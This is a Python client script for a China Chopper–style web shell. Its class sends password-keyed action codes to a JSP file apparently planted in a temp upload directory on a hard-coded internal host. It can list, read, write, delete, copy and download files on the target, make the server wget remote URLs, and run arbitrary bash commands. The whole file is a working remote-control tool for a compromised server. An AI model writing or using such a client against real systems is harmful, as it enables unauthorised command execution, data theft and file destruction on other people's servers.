import requests as r

host = '10.3.25.12'

class Knife (object):

    def __init__(self, url, pwd, encoding='utf-8'):
        self.url = url
        self.pwd = pwd
        self.encoding = encoding

    def _data(self, action, p1=None, p2=None):
        data_dict = {
            self.pwd: action,
            'z0': self.encoding,
            'z1': p1,
            'z2': p2
        }
        return {k:v for k,v in data_dict.items() if v}

    def _send(self, action, p1=None, p2=None):
        data = self._data(action, p1, p2)
        rep = r.post(url, data)
        rep.encoding = self.encoding
        return self._parse(rep.text)

    def _bsend(self, action, p1=None, p2=None):
        data = self._data(action, p1, p2)
        rep = r.post(url, data)
        return self._bparse(rep.content)

    def _parse(self, content):
        return content.replace('\r\n', '\n').lstrip("\r\n->|").rstrip("|<-\r\n")

    def _bparse(self, content):
        return content.replace(b'\r\n', b'\n').lstrip(b"\r\n->|").rstrip(b"|<-\r\n")

    def test(self):
        return self._send('A') 

    def list(self, path='.'):
        result = self._send('B', path)
        files = []
        for line in result.split('\n'):
            data = line.split('\t')
            if len(data) >= 4: 
                f = {
                    'name': data[0],
                    'date': data[1],
                    'size': data[2],
                    'perm': data[3]
                }
                files.append(f)
        return files

    def read(self, path):
        return self._send('C', path)

    def write(self, path, text):
        return self._send('D', path, text)

    def delete(self, path):
        return self._send('E', path)

    def download(self, path):
        return self._bsend('F', path)

    def upload(self, path, content):
        pass

    def copy(self, path1, path2):
        return self._send('H', path1, path2)

    def move(self, path1, path2):
        return self._send('I', path1, path2)

    def mkdir(self, path):
        return self._send('J', path)

    def time(self, path, t):
        return self._send('K', path, t)

    def wget(self, url, path):
        return self._send('L', url, path)

    def exec(self, cmd, soft='bash'):
        return self._send('M', '-c'+soft, cmd)


url = "http://10.3.25.12:8004/rescloud/temp/a2f19f84-4ed9-4935-87ca-abec975ea328.jsp"
if __name__ == '__main__':
    kf = Knife(url, 'twsm')
